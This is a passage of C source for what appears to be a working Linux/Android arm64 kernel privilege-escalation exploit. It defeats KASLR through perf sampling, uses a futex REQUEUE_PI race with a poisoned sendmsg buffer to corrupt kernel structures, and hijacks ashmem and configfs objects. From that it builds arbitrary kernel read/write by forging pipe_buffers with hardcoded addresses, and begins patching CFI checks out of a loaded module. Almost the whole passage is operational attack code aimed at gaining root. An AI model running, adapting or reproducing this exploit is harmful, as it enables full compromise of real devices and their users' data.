	while (off + 8 <= head) {
		struct perf_event_header *h = (struct perf_event_header *)(ring + 4096 + off);

		if (h->size < 8 || off + h->size > head)
			break;
		if (h->type == PERF_RECORD_SAMPLE) {
			uint64_t ip = *(uint64_t *)((uint8_t *)h + 8);

			if (ip >= 0xffffff0000000000ULL && n_ips < 65536) {
				uint64_t i = (ip >> 7) % 65537;

				while (ip_h[i].cnt && ip_h[i].key != ip)
					i = (i + 1) % 65537;
				if (!ip_h[i].cnt) {
					ip_h[i].key = ip;
					n_ips++;
				}
				ip_h[i].cnt++;
			}
		}
		off += h->size;
	}
	if (!n_ips) {
		LOGI("[t37] slide pin: no kernel IPs sampled (FAIL)");
		munmap(ring, ring_len);
		close(fd);
		return -1;
	}
	LOGI("[t37] slide pin: %d distinct kernel IPs", n_ips);

	/* ---- median-distance vote (39-r108; port of pin_slide_median.py,
	 * see t37_median_vote). ---- */
	{
		uint64_t s;

		if (t37_median_vote(ip_h, n_starts, &s) != 0) {
			munmap(ring, ring_len);
			close(fd);
			return -1;
		}
		*out = s;
	}
	munmap(ring, ring_len);
	close(fd);
	return 0;
}

/* 39-r108 oneclick: forced slide (argv[3]) keeps the old path; the default
 * path now samples + votes in-process TWICE and refuses to run on
 * disagreement (the run_r102_verify.sh [4] gate, brought in-probe). */
static int t37_pin_slide(void)
{
	uint64_t s1, s2;

	if (g_slide_forced) {
		g_slide = g_slide_forced;
		LOGI("[t37] slide pinned = %s (forced, vote skipped)", u64hex(g_slide));
		return 0;
	}
	if (t37_slide_vote_once(&s1) != 0)
		return -1;
	LOGI("[t37] slide sample #1 = %s", u64hex(s1));
	if (t37_slide_vote_once(&s2) != 0)
		return -1;
	LOGI("[t37] slide sample #2 = %s", u64hex(s2));
	if (s1 != s2) {
		LOGI("[t37] DOUBLE-SAMPLE GATE FAILED: %s != %s — rerun to resample",
		     u64hex(s1), u64hex(s2));
		return -1;
	}
	g_slide = s1;
	LOGI("[t37] slide pinned = %s (median vote x2 agreed)", u64hex(g_slide));
	return 0;
}


/* ============================================================================
 * Page-base oracle: run PMI over pread loop on the marker memfd; identify
 * the marker page by the 36 §1.5 triple check; verify across two runs.
 * Sets g_page_base. Returns 0 on success.
 * ============================================================================
 */
static int t37_pin_page_base(void)
{
	int fd;
	uint8_t *ring;
	uint64_t ring_len, samples = 0;
	uint8_t buf[4096];
	uint64_t cand = 0;

	if (t37_pmi_open(&fd, &ring, &ring_len)) {
		LOGI("[t37] page-base PMI open FAIL");
		return -1;
	}
	for (int i = 0; i < 60000; i++)
		if (pread(g_page_fd, buf, 4096, 0) < 0) break;
	ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
	t37_pmi_scan(ring, RING_PAGES, &samples);

	/* top physmap page-base by count, then triple-check each candidate */
	{
		uint64_t best = 0, best_cnt = 0;
		for (uint64_t i = 0; i < HB_CAP; i++)
			if (pb_h[i].cnt > best_cnt) { best_cnt = pb_h[i].cnt; best = pb_h[i].key; }
		LOGI("[t37] page oracle run1: samples=%llu top-physmap-page=%s n=%llu",
		     (unsigned long long)samples, u64hex(best), (unsigned long long)best_cnt);
	}
	/* pick candidate = the physmap page base whose virt_to_page() is present
	 * in vmemmap values (decisive); among all, prefer highest (c) count */
	{
		uint64_t best = 0, best_score = 0;
		for (uint64_t i = 0; i < HB_CAP; i++) {
			if (!pb_h[i].cnt) continue;
			uint64_t score = t37_vm_count(gl36_virt_to_page(pb_h[i].key));
			if (score > best_score) {
				best_score = score;
				best = pb_h[i].key;
			}
		}
		if (!best || best_score < 20) {
			LOGI("[t37] page oracle run1: decisive (c) check FAILED (no struct page* match)");
			munmap(ring, ring_len); close(fd);
			return -1;
		}
		cand = best;
		LOGI("[t37] page oracle run1: marker page = %s (pageptr n=%llu, triple=%d/3)",
		     u64hex(cand), (unsigned long long)best_score,
		     t37_triple_check(cand));
	}
	munmap(ring, ring_len);
	close(fd);

	/* run 2: stability confirmation (same fd, fresh collection) */
	if (t37_pmi_open(&fd, &ring, &ring_len)) {
		LOGI("[t37] page-base PMI open (run2) FAIL");
		return -1;
	}
	for (int i = 0; i < 60000; i++)
		if (pread(g_page_fd, buf, 4096, 0) < 0) break;
	ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
	t37_pmi_scan(ring, RING_PAGES, &samples);
	{
		uint64_t score = t37_vm_count(gl36_virt_to_page(cand));
		int triple = t37_triple_check(cand);
		LOGI("[t37] page oracle run2: marker page = %s (pageptr n=%llu, triple=%d/3) %s",
		     u64hex(cand), (unsigned long long)score, triple,
		     (triple >= 2) ? "STABLE (2-run agree)" : "UNSTABLE");
		if (triple < 2) {
			munmap(ring, ring_len); close(fd);
			return -1;
		}
	}
	munmap(ring, ring_len);
	close(fd);

	g_page_base = cand;
	LOGI("[t37] page_base pinned = %s", u64hex(g_page_base));
	return 0;
}

/* ============================================================================
 * Poison construction (dry-run form). Shared by victim (real) and consumer
 * (expected template) so source readback consistency is by construction.
 *
 * iov window [W-0x68, W+0x18): 8 iovecs, seg0 = payload (ret verdict), all
 * others {uva, 0} -> tree_entry {0,0,0} live poison (29-r7 blocking form).
 * sockaddr window [W+0x18, W+0x48): 36 §8.1 mask-solved full-field layout.
 * ============================================================================
 */
static void t37_build_poison(struct iovec *iov, unsigned char *sa,
			     struct msghdr *m)
{
	int i;

		for (i = 0; i < 8; i++) {
		iov[i].iov_base = (void *)(uintptr_t)SM_IOV_FILL_UVA;
		iov[i].iov_len = 0;
	}
	iov[0].iov_base = g_sm2_payload;     /* seg0 = data (ret == 64 verdict) */
	iov[0].iov_len = SM2_PAYLOAD;
	/* 37-r4 fix (10:14 KE): the 128B iov copy window is [W-0x68, W+0x18);
	 * iov[6].len lands on W+0x00 (tree.pc), iov[7].base on W+0x08
	 * (tree.rb_right!), iov[7].len on W+0x10 (tree.rb_left). The generic
	 * 0x5000 placeholder on iov[7].base became tree.rb_right = 0x5000 and
	 * erase's __rb_change_child wrote to [0x5000] (FAR=0x5000). Force the
	 * three in-window slots to ZERO explicitly; 0x5000 stays only on
	 * out-of-window entries (iov[1..5], and iov[6].base @ W-0x08). */
	iov[6].iov_base = (void *)(uintptr_t)SM_IOV_FILL_UVA; /* W-0x08: out of window */
	iov[6].iov_len = 0;                                   /* W+0x00 = tree.pc = 0 */
	iov[7].iov_base = NULL;                               /* W+0x08 = tree.rb_right = 0 */
	iov[7].iov_len = 0;                                   /* W+0x10 = tree.rb_left = 0 */

	/* sockaddr: full 48B field delivery via 36 encoder + 37 canary prio */
	{
		uint64_t pi_pc = (g_page_base & ~0x00FFFF00ULL) | 1;
		uint64_t pi_r = 0, pi_l = 0;
		uint64_t w_task = GL36_INIT_TASK_STATIC + g_slide;
		uint64_t w_lock = g_fake_lock;
		uint32_t prio = T37_POISON_PRIO;
		uint32_t pad = 0;

		memset(sa, 0, SM_NAMELEN);
		memcpy(sa + 0, &pi_pc, 8);    /* W+0x18 pi_tree.pc (mask-solved) */
		memcpy(sa + 8, &pi_r, 8);     /* W+0x20 pi_tree.rb_right = 0 */
		memcpy(sa + 16, &pi_l, 8);    /* W+0x28 pi_tree.rb_left = 0 */
		memcpy(sa + 24, &w_task, 8);  /* W+0x30 task = init_task */
		memcpy(sa + 32, &w_lock, 8);  /* W+0x38 lock = fake_lock */
		memcpy(sa + 40, &prio, 4);    /* W+0x40 prio = 3 (canary) */
		memcpy(sa + 44, &pad, 4);     /* W+0x44 pad */
	}

	memset(m, 0, sizeof(*m));
	m->msg_name = sa;
	m->msg_namelen = SM_NAMELEN;
	m->msg_iov = iov;
	m->msg_iovlen = 8;
}

/* socket formation (29-r7): bind rcv to the poison 48B abstract name, flood
 * the receive queue past max_dgram_qlen with 4 rotating fill senders. */
static int t37_sockets_setup(void)
{
	int i, r;
	unsigned char dummy[24];

	memcpy(g_sm2_payload, "GLK8T37DRYRUN-PAYLOAD-", 22);
	for (i = 22; i < (int)sizeof(g_sm2_payload); i++)
		g_sm2_payload[i] = (unsigned char)('0' + (i % 10));

	g_sk_snd = socket(AF_UNIX, SOCK_DGRAM, 0);
	g_sk_rcv = socket(AF_UNIX, SOCK_DGRAM, 0);
	g_sk_fill = socket(AF_UNIX, SOCK_DGRAM, 0);
	g_sk_fill2 = socket(AF_UNIX, SOCK_DGRAM, 0);
	g_sk_fill3 = socket(AF_UNIX, SOCK_DGRAM, 0);
	g_sk_fill4 = socket(AF_UNIX, SOCK_DGRAM, 0);
	if (g_sk_snd < 0 || g_sk_rcv < 0 || g_sk_fill < 0 || g_sk_fill2 < 0 ||
	    g_sk_fill3 < 0 || g_sk_fill4 < 0)
		return -1;

	/* build the template sockaddr (same fields as t37_build_poison) */
	{
		struct iovec iov[8];
		struct msghdr m;

		t37_build_poison(iov, g_sa_tmpl, &m);
	}

	r = bind(g_sk_rcv, (struct sockaddr *)g_sa_tmpl, SM_NAMELEN);
	if (r != 0) {
		LOGI("[t37] bind receiver FAIL errno=%d(%s)", errno, errno_name(errno));
		return -1;
	}
	LOGI("[t37] receiver bound: name=%d bytes (abstract, full-field poison name)",
	     SM_NAMELEN);

	{
		int snds[4], ns = 0, total = 0, eagain_cnt = 0, done = 0, si;

		snds[ns++] = g_sk_fill;
		snds[ns++] = g_sk_fill2;
		snds[ns++] = g_sk_fill3;
		snds[ns++] = g_sk_fill4;
		for (si = 0; si < ns && !done; si++) {
			for (i = 0; i < SM2_FILL_MAX; i++) {
				errno = 0;
				r = (int)sendto(snds[si], dummy, sizeof(dummy),
						MSG_DONTWAIT,
						(struct sockaddr *)g_sa_tmpl,
						SM_NAMELEN);
				if (r < 0 && errno == EAGAIN) {
					eagain_cnt++;
					break;
				}
				if (r < 0) {
					LOGI("[t37] fill sendto FAIL errno=%d(%s)",
					     errno, errno_name(errno));
					return -1;
				}
				total++;
			}
			if (total > 600)
				done = 1;
		}
		LOGI("[t37] fill: %d SKBs queued across %d senders (EAGAIN x%d) — "
		     "recvq_full=%s -> victim sendmsg will block",
		     total, ns, eagain_cnt, done ? "YES" : "NO");
		if (!done) {
			LOGI("[t37] queue below qlen(600) — blocking precondition fails, "
			     "abandon round (non-destructive)");
			return -1;
		}
	}
	return 0;
}

static void t37_drain_queue(void)
{
	unsigned char buf[256];
	int n, total = 0;
	int fl = fcntl(g_sk_rcv, F_GETFL);

	if (fl >= 0)
		(void)fcntl(g_sk_rcv, F_SETFL, fl | O_NONBLOCK);
	while ((n = (int)read(g_sk_rcv, buf, sizeof(buf))) > 0)
		total += n;
	if (fl >= 0)
		(void)fcntl(g_sk_rcv, F_SETFL, fl);
	LOGI("[t37] drain: %d bytes / queue emptied (victim sendmsg will return)",
	     total);
}

/* ============================================================================
 * Three-thread formation (29-r7 identical): waiter(=victim) / owner / consumer
 * ============================================================================
 */
static void *waiter_thread(void *arg)
{
	struct timespec ts;
	long ret;
	struct iovec iov[8];
	unsigned char sa[SM_NAMELEN] __attribute__((aligned(8)));
	struct msghdr m;

	(void)arg;
	victim_tid = (int)syscall(SYS_gettid);
	prctl(PR_SET_NAME, "t37victim", 0, 0, 0);   /* r27 walk-by-comm */

	futex_pi_lock(&f_pi_chain);
	a_ready = 1;
	usleep(20000);

	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_nsec += 50000000;
	if (ts.tv_nsec >= 1000000000) {
		ts.tv_sec++;
		ts.tv_nsec -= 1000000000;
	}
	a_waiting = 1;
	errno = 0;
	ret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
	LOGI("R%d [waiter] WAIT_REQUEUE_PI ret=%ld errno=%d(%s)",
	     g_round_no, ret, errno, errno_name(errno));

	futex_wait_int(&deadlock_seen, 0);   /* safe: poison happens after this */

	/* poison burst: blocking sendmsg carrier (last syscall of this thread) */
	t37_pin_cpu(6);
	t37_build_poison(iov, sa, &m);
	g_last_iov_addr = (uintptr_t)iov;
	g_last_sa_addr = (uintptr_t)sa;
	LOGI("R%d [waiter] T37 carrier: pi_pc=%s(mask) task=%s lock=%s prio=%d; "
	     "tree_entry={0,0,0} blocking form",
	     g_round_no,
	     u64hex((g_page_base & ~0x00FFFF00ULL) | 1),
	     u64hex(GL36_INIT_TASK_STATIC + g_slide),
	     u64hex(g_fake_lock), T37_POISON_PRIO);
	{
		sigset_t all;
		sigfillset(&all);
		(void)pthread_sigmask(SIG_BLOCK, &all, NULL);
	}
	__atomic_store_n(&stamp_sent, 1u, __ATOMIC_RELEASE);
	errno = 0;
	g_sm_ret = syscall(T37_SYS_SENDMSG, g_sk_snd, &m, 0UL);
	g_sm_errno = errno;
	/* blocking form: reaching here = drained and delivered (ret = payload) */
	__atomic_store_n(&stamp_ready, 1u, __ATOMIC_RELEASE);
	for (;;) {
		volatile int spin = 0;
		(void)spin;
	}
	return NULL;
}

static void *owner_thread(void *arg)
{
	(void)arg;
	t37_pin_cpu(1);
	futex_pi_lock(&f_pi_target);
	while (!a_ready)
		usleep(1000);
	b_started = 1;
	futex_pi_lock(&f_pi_chain);          /* blocks: PI chain owner <- waiter */
	for (;;)
		usleep(1000000);
	return NULL;
}

/* ============================================================================
 * Source readback (28/29 smsafe2 form): consumer reads back victim's user-side
 * poison source (iov[8] 128B + sockaddr 48B = 176B) via process_vm_readv and
 * compares byte-by-byte against the expected template (same constructor).
 * ============================================================================
 */
static void t37_readback_selfcheck(void)
{
	unsigned char expected[128 + SM_NAMELEN];
	unsigned char got[128 + SM_NAMELEN];
	struct iovec iov_exp[8];
	unsigned char sa_exp[SM_NAMELEN];
	struct msghdr m_exp;
	struct iovec lvec;
	struct iovec riov[2];
	long r;
	int i, bad = -1;

	t37_build_poison(iov_exp, sa_exp, &m_exp);
	memcpy(expected, iov_exp, 128);
	memcpy(expected + 128, sa_exp, SM_NAMELEN);

	lvec.iov_base = got;
	lvec.iov_len = sizeof(got);
	riov[0].iov_base = (void *)g_last_iov_addr;
	riov[0].iov_len = 128;
	riov[1].iov_base = (void *)g_last_sa_addr;
	riov[1].iov_len = SM_NAMELEN;
	errno = 0;
	r = syscall(SYS_process_vm_readv, victim_tid, &lvec, 1UL, riov, 2UL, 0UL);
	for (i = 0; r == (long)sizeof(expected) && i < (int)sizeof(expected); i++) {
		if (got[i] != expected[i]) {
			bad = i;
			break;
		}
	}
	LOGI("R%d [consumer] t37 readback process_vm_readv(tid=%d) ret=%ld "
	     "errno=%d(%s) %s", g_round_no, victim_tid, r, errno,
	     errno_name(errno),
	     (r == (long)sizeof(expected) && bad < 0) ?
	     "OK — victim poison source iov[8]+sockaddr 176B matches T37 template" :
	     "MISMATCH (source corrupted or layout drift)");
	if (bad >= 0)
		LOGI("R%d [consumer] t37 readback first-diff @%d: got %02x want %02x",
		     g_round_no, bad, got[bad], expected[bad]);
}

/* ============================================================================
 * 37-r17: Tier-3 write-round engine (ashmem misc hijack -> configfs primitive
 * -> privilege chain). Offsets merged from: subagent A (configfs_buffer/
 * ashmem_area disasm, this kernel), subagent B (aresin MT6893 4.14.186
 * VERIFIED target.h + root.c chain order), 35 §4.1/§4.5/§5.3, 36 §4.
 * ============================================================================ */
static int g_root_fd = -1;        /* hijacked-fd (f_op = fake_fops) */
static uint64_t g_consumer_task;
static char g_walk_comm[16];      /* 38-r42: unique-per-run walk comm */

/* fwd decls for the physrw engine (bodies live further below) */
static ssize_t t37_kread_data(int fd, uint64_t target, void *out, size_t len);
static ssize_t t37_kwrite_data(int fd, uint64_t target, const void *data,
			       size_t len);
static uint64_t t37_kread64(int fd, uint64_t target);
static uint64_t t37_find_task_by_comm(int fd, const char *comm);

/* ============================================================================
 * 38-r59: PHYSRW — steady-state arbitrary read/write through a forged
 * pipe_buffer (research/38-physrw-design.md §1-§7, all offsets disasm-
 * verified against THIS kernel tree). Root chain must have completed and
 * g_root_fd (configfs primitive) must be live. The pipe channel then does
 * bulk reads/writes with ZERO additional plant round-trips.
 * ============================================================================ */
#define PRW_TASK_FILES_OFF   0x7B8u   /* __fget: ldr x23,[sp_el0,#0x7b8]  */
#define PRW_FILES_FDT_OFF    0x20u    /* __fget: ldr x8,[x23,#0x20]      */
#define PRW_FDT_FD_OFF       0x08u    /* __fget: ldr x8,[x8,#8]; ldr [x8,w9,uxtw#3] */
#define PRW_FILE_FOP_OFF     0x28u    /* alloc_file: str x19,[x0,#0x28]  */
#define PRW_FILE_PRIV_OFF    0xC8u    /* pipe_read: ldr x20,[x8,#0xc8]   */
#define PRW_PIPE_BUFS_OFF    0x78u    /* pipe_write: ldr x9,[x20,#0x78]  */
#define PRW_PIPE_NRBUFS_OFF  0x38u
#define PRW_PIPE_CURBUF_OFF  0x3Cu
#define PRW_PIPE_BUFFERS_OFF 0x40u
#define PRW_PIPE_READERS_OFF 0x44u
#define PRW_BUF_SIZE         40u      /* sizeof(struct pipe_buffer)      */
/* struct pipe_buffer: page@0, offset@8(u), len@0xC(u), ops@0x10, flags@0x18, private@0x20 */
#define PRW_PIPEFIFO_FOPS    0xFFFFFF8009A4C028ULL  /* design §2.2 */
#define PRW_ANON_PIPE_OPS    0xFFFFFF8009A4BFD8ULL  /* design §2.2: can_merge=1 */
#define PRW_PAGE_OFFSET      0xFFFFFFC000000000ULL  /* design §1.1 */
#define PRW_VMEMMAP_START    0xFFFFFFBF00000000ULL  /* design §1.1 */
#define PRW_JT_CONFIRM       0xFFFFFF8009422C60ULL  /* design §2.2 generic_pipe_buf_confirm.cfi_jt */
#define PRW_JT_GET           0xFFFFFF800941F654ULL  /* design §2.2 generic_pipe_buf_get.cfi_jt */

/* virt_to_page for the linear-map domain (design §1.3): page* B =
 * VMEMMAP_START + ((T - PAGE_OFFSET) >> 12 << 6) */
static uint64_t prw_virt_to_page(uint64_t t)
{
	return PRW_VMEMMAP_START + (((t - PRW_PAGE_OFFSET) >> 12) << 6);
}

static void prw_fill_forge(uint8_t *b40, uint64_t t_page_va, uint32_t off,
			   uint32_t len)
{
	uint64_t ops = PRW_ANON_PIPE_OPS + g_slide;

	memset(b40, 0, PRW_BUF_SIZE);
	memcpy(b40 + 0x0, &(uint64_t){ t_page_va }, 8);   /* page  */
	memcpy(b40 + 0x8, &off, 4);                        /* offset */
	memcpy(b40 + 0xC, &len, 4);                        /* len    */
	memcpy(b40 + 0x10, &ops, 8);                       /* ops    */
	/* flags@0x18 = 0, private@0x20 = 0 (memset) */
}

static void prw_log_buf(const char *tag, const uint8_t *b40)
{
	uint64_t page, ops;
	uint32_t off, len;

	memcpy(&page, b40 + 0x0, 8);
	memcpy(&off, b40 + 0x8, 4);
	memcpy(&len, b40 + 0xC, 4);
	memcpy(&ops, b40 + 0x10, 8);
	LOGI("[physrw] %s: page=%s off=%u len=%u ops=%s flags=%u priv=%s",
	     tag, u64hex(page), off, len, u64hex(ops),
	     *(const uint32_t *)(b40 + 0x18), u64hex(*(const uint64_t *)(b40 + 0x20)));
}

/* Full P0-P3 ladder. Returns 0 on success (session torn down clean). */
static void t37_physrw_round(void)
{
	int pfd[2] = { -1, -1 };
	uint8_t saved40[PRW_BUF_SIZE];
	uint8_t forge40[PRW_BUF_SIZE];
	uint8_t rb40[PRW_BUF_SIZE];
	uint64_t task, files, fdt, fpp, file, pipe, bufs, slot, ops_va;
	uint64_t anon_ops, jt_confirm, t_page;
	uint32_t nrbufs, curbuf, buffers, readers;
	int fd;

	if (g_root_fd < 0) {
		LOGI("[physrw] FATAL no root fd (configfs primitive down)");
		return;
	}
	fd = g_root_fd;

	if (pipe2(pfd, 0) != 0) {
		LOGI("[physrw] FATAL pipe2 errno=%d", errno);
		return;
	}
	if (pfd[0] < 0 || pfd[1] < 0) {
		LOGI("[physrw] FATAL pipe2 errno=%d", errno);
		return;
	}
	if (write(pfd[1], "A", 1) != 1) {
		LOGI("[physrw] FATAL seed write errno=%d", errno);
		goto close_pipe;
	}

	/* walk: task(comm) → files → fdt → fd[] → file → pipe → bufs.
	 * 38-r60: match ONLY the two pipe2() fds — the first f_op-matching
	 * slot in a raw scan can be adb's stdout/stderr pipe (r59 hit fd=1
	 * = shell stdout, nrbufs=0 curbuf=3 = wrong pipe). */
	task = t37_find_task_by_comm(fd, g_walk_comm);
	if (!task) {
		LOGI("[physrw] FATAL comm-walk miss (%s)", g_walk_comm);
		goto close_pipe;
	}
	files = t37_kread64(fd, task + PRW_TASK_FILES_OFF);
	fdt = files ? t37_kread64(fd, files + PRW_FILES_FDT_OFF) : 0;
	if (!files || !fdt) {
		LOGI("[physrw] FATAL files/fdt read FAIL files=%s fdt=%s",
		     u64hex(files), u64hex(fdt));
		goto close_pipe;
	}
	LOGI("[physrw] walk: files=%s fdt=%s (fdt==files+0x28? %s)",
	     u64hex(files), u64hex(fdt),
	     fdt == files + 0x28 ? "yes(unexpanded)" : "no(expanded-heap)");
	{
		uint64_t fd_array, max_fds_v;
		uint32_t max_fds;
		int found = -1, dfd;
		uint64_t fop;

		max_fds_v = t37_kread64(fd, fdt + 0x0);  /* max_fds@0 (u32) + pad */
		memcpy(&max_fds, &max_fds_v, 4);
		fd_array = t37_kread64(fd, fdt + PRW_FDT_FD_OFF);
		LOGI("[physrw] walk: max_fds=%u fd_array=%s (target fds: "
		     "r=%d w=%d)", max_fds, u64hex(fd_array), pfd[0], pfd[1]);
		if (!fd_array || max_fds > 1024)
			goto close_pipe;
		for (dfd = 0; dfd < 2 && found < 0; dfd++) {
			int want = pfd[dfd];

			if (want < 0 || want >= (int)max_fds)
				continue;
			fpp = t37_kread64(fd, fd_array +
					  (uint64_t)want * 8);
			if (!fpp)
				continue;
			fop = t37_kread64(fd, fpp + PRW_FILE_FOP_OFF);
			if (fop == PRW_PIPEFIFO_FOPS + g_slide) {
				found = want;
				break;
			}
		}
		if (found < 0) {
			LOGI("[physrw] FATAL pipe fds r=%d/w=%d not matched "
			     "against pipefifo_fops (fd table shape?)", pfd[0],
			     pfd[1]);
			goto close_pipe;
		}
		LOGI("[physrw] walk: pipe fd=%d (== our pipe2 fd; f_op == "
		     "pipefifo_fops+slide EXACT)", found);
		file = t37_kread64(fd, fd_array + (uint64_t)found * 8);
	}

	pipe = t37_kread64(fd, file + PRW_FILE_PRIV_OFF);
	if (!pipe) {
		LOGI("[physrw] FATAL private_data=0");
		goto close_pipe;
	}
	{
		uint64_t v;

		v = t37_kread64(fd, pipe + PRW_PIPE_NRBUFS_OFF);
		memcpy(&nrbufs, &v, 4);
		v = t37_kread64(fd, pipe + PRW_PIPE_CURBUF_OFF);
		memcpy(&curbuf, &v, 4);
		v = t37_kread64(fd, pipe + PRW_PIPE_BUFFERS_OFF);
		memcpy(&buffers, &v, 4);
		v = t37_kread64(fd, pipe + PRW_PIPE_READERS_OFF);
		memcpy(&readers, &v, 4);
	}
	bufs = t37_kread64(fd, pipe + PRW_PIPE_BUFS_OFF);
	LOGI("[physrw] pipe=%s bufs=%s nrbufs=%u curbuf=%u buffers=%u "
	     "readers=%u", u64hex(pipe), u64hex(bufs), nrbufs, curbuf,
	     buffers, readers);
	/* design §6.2 step 0 invariant: 1 seeded buffer, default 16 slots */
	if (nrbufs != 1 || curbuf != 0 || buffers != 16 || readers < 1) {
		LOGI("[physrw] FATAL pipe state not in seeded shape");
		goto close_pipe;
	}
	slot = bufs + (uint64_t)curbuf * PRW_BUF_SIZE;
	if (t37_kread_data(fd, slot, saved40, PRW_BUF_SIZE) !=
	    (ssize_t)PRW_BUF_SIZE) {
		LOGI("[physrw] FATAL saved40 read FAIL");
		goto close_pipe;
	}
	prw_log_buf("P0 saved40", saved40);

	/* P0 fingerprint: page is a vmemmap-domain 64B-aligned real page,
	 * offset=0, len=1, ops=anon_pipe_buf_ops+slide, flags=0, priv=0 */
	memcpy(&ops_va, saved40 + 0x10, 8);
	anon_ops = PRW_ANON_PIPE_OPS + g_slide;
	jt_confirm = PRW_JT_CONFIRM + g_slide;
	if (ops_va != anon_ops) {
		LOGI("[physrw] FATAL P0 ops=%s expect anon=%s — walk/slide "
		     "mismatch, ABORT (nothing touched)", u64hex(ops_va),
		     u64hex(anon_ops));
		goto close_pipe;
	}
	{
		uint64_t page0;
		uint32_t off0, len0;

		memcpy(&page0, saved40 + 0x0, 8);
		memcpy(&off0, saved40 + 0x8, 4);
		memcpy(&len0, saved40 + 0xC, 4);
		if ((page0 >> 40) != 0xffffff ||
		    (page0 & (PRW_VMEMMAP_START)) != PRW_VMEMMAP_START ||
		    (page0 & 0x3F) != 0 || off0 != 0 || len0 != 1) {
			LOGI("[physrw] FATAL P0 page/off/len form "
			     "(page=%s off=%u len=%u)", u64hex(page0),
			     off0, len0);
			goto close_pipe;
		}
		LOGI("[physrw] P0 fingerprint OK (ops exact + page in vmemmap "
		     "domain + off=0 len=1) — walk chain fully proven");
	}
	/* ops table content: can_merge==1 @+0, confirm jt @+8 (design §6.3 P0) */
	{
		uint64_t cm, cfm;

		cm = t37_kread64(fd, anon_ops);
		cfm = t37_kread64(fd, anon_ops + 8);
		LOGI("[physrw] P0 ops table: can_merge+confirm_jt=%s "
		     "(expect 00000001_%s...low32=1) confirm=%s (expect %s)",
		     u64hex(cm), u64hex(jt_confirm >> 32), u64hex(cfm),
		     u64hex(jt_confirm));
		if ((uint32_t)cm != 1 || cfm != jt_confirm) {
			LOGI("[physrw] FATAL P0 ops table content mismatch");
			goto close_pipe;
		}
	}

	/* P1: marker page self-READ (read channel closed-loop) */
	{
		uint8_t big[64];
		ssize_t n;

		t_page = prw_virt_to_page(g_page_base);
		prw_fill_forge(forge40, t_page, 0, 9);   /* len = N+1 */
		if (t37_kwrite_data(fd, slot, forge40, PRW_BUF_SIZE) !=
		    (ssize_t)PRW_BUF_SIZE) {
			LOGI("[physrw] FATAL P1 forge write FAIL");
			goto restore;
		}
		if (t37_kread_data(fd, slot, rb40, PRW_BUF_SIZE) !=
		    (ssize_t)PRW_BUF_SIZE ||
		    memcmp(rb40, forge40, PRW_BUF_SIZE) != 0) {
			LOGI("[physrw] FATAL P1 forge readback mismatch — "
			     "NOT reading (r34 gate)");
			goto restore;
		}
		n = read(pfd[0], big, 8);    /* exactly N=8, len=9 stays 1 */
		if (n != 8) {
			LOGI("[physrw] FATAL P1 read n=%zd errno=%d", n,
			     errno);
			goto restore;
		}
		LOGI("[physrw] P1 marker read: %.8s (user map: %.8s) %s",
		     (char *)big, (char *)g_page_map,
		     memcmp(big, g_page_map, 8) == 0 ? "MATCH <<< READ "
		     "CHANNEL CLOSED-LOOP" : "MISMATCH");
	}

		/* P2: marker page self-WRITE (write/merge channel closed-loop).
		 * 0x100 is our own scratch area in the marker page (r28-proven
		 * free), so no original-byte preservation needed. */
	{
		const char *wtest = "T3PWRWOK";
		uint8_t big[64];
		ssize_t n;

		prw_fill_forge(forge40, t_page, 0x100, 0);   /* len=0 write-forge */
		if (t37_kwrite_data(fd, slot, forge40, PRW_BUF_SIZE) !=
		    (ssize_t)PRW_BUF_SIZE) {
			LOGI("[physrw] FATAL P2 forge write FAIL");
			goto restore;
		}
		if (t37_kread_data(fd, slot, rb40, PRW_BUF_SIZE) !=
		    (ssize_t)PRW_BUF_SIZE ||
		    memcmp(rb40, forge40, PRW_BUF_SIZE) != 0) {
			LOGI("[physrw] FATAL P2 forge readback mismatch");
			goto restore;
		}
		errno = 0;
		n = write(pfd[1], wtest, 8);   /* 8 < 4096, non-multiple */
		if (n != 8) {
			LOGI("[physrw] FATAL P2 write n=%zd errno=%d", n,
			     errno);
			goto restore;
		}
		if (t37_kread_data(fd, g_page_base + 0x100, big, 8) != 8 ||
		    memcmp(big, wtest, 8) != 0) {
			LOGI("[physrw] P2 VERIFY readback FAIL (%.8s vs %.8s)",
			     (char *)big, wtest);
			goto restore;
		}
		LOGI("[physrw] P2 marker write: %.8s verified via configfs "
		     "kread <<< WRITE CHANNEL CLOSED-LOOP", (char *)big);
	}

	/* P3: heap cross-check — read pipe->bufs (kmalloc-1024) via the pipe
	 * channel and compare with the configfs kread of the same 40B. */
	{
		uint8_t pipe_ch[PRW_BUF_SIZE];
		ssize_t n;

		prw_fill_forge(forge40, prw_virt_to_page(bufs),
			       (uint32_t)(slot - bufs) & 0xFFF, 41);
		if (t37_kwrite_data(fd, slot, forge40, PRW_BUF_SIZE) !=
		    (ssize_t)PRW_BUF_SIZE) {
			LOGI("[physrw] FATAL P3 forge write FAIL");
			goto restore;
		}
		if (t37_kread_data(fd, slot, rb40, PRW_BUF_SIZE) !=
		    (ssize_t)PRW_BUF_SIZE ||
		    memcmp(rb40, forge40, PRW_BUF_SIZE) != 0) {
			LOGI("[physrw] FATAL P3 forge readback mismatch");
			goto restore;
		}
		n = read(pfd[0], pipe_ch, 40);
		if (n != 40) {
			LOGI("[physrw] FATAL P3 read n=%zd errno=%d", n,
			     errno);
			goto restore;
		}
		LOGI("[physrw] P3 heap cross-check: pipe-channel 40B vs "
		     "configfs saved40 %s",
		     memcmp(pipe_ch, saved40, PRW_BUF_SIZE) == 0 ?
		     "MATCH <<< LINEAR DOMAIN ANYWHERE READABLE" :
		     "MISMATCH (non-fatal, logged)");
	}

	/* P4 (38-r63 rewrite, research/38-p4-nop-slowpath-design.md):
	 * NOP every `bl __cfi_slowpath` in the loaded CFI kernelsu.ko via the
	 * linear alias of its text pages.
	 *
	 * 38-r63 ROOT-CAUSE FIX (the "pgd entry -> all-zero table" mystery of
	 * r62o..r62w): arm64 KASLR shifts the linear map at 1GB granularity
	 * (arch/arm64/mm/init.c arm64_memblock_init: memstart_addr -=
	 * ARM64_MEMSTART_ALIGN * ((range * memstart_offset_seed) >> 16)), so
	 *   alias(pa) = PAGE_OFFSET + (pa - memstart_addr)
	 *             = PAGE_OFFSET + (pa - 0x40000000) + m*1GB,  m >= 0.
	 * The old code used the m=0 form and therefore read a page m GB away
	 * (a free zero page) instead of the pmd table -- every "all-zero table"
	 * observation was that bug. m is calibrated below against the early
